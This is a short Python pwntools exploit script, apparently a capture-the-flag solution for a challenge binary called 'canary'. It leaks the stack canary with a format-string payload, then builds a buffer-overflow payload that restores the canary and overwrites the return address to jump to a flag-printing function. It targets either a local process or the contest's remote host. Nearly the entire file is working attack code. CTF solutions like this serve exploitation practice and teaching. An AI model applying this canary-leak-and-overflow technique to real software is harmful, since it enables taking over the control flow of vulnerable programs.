from pwn import *
import sys

context.arch = "amd64"

fsb_offset = 6
canary_offset = 56
bof_offset = 72
printf_got = 0x601fd0
flag = 0x00400787

if len(sys.argv) == 1:
    r = process("./canary")
    print(r.pid)
    sleep(5)
else:
    r = remote("shell.actf.co",20701)

# fsa
payload = b"%17$lx"


r.sendline(payload)
r.recvuntil("you, ")
canary = int(r.recvline()[:-2], 16)

log.info("canary {}".format(hex(canary)))

# bof
payload = b"A" * canary_offset
payload += p64(canary)
payload += b"B" * (bof_offset - len(payload))
payload += p64(flag)

r.sendline(payload)

r.interactive()
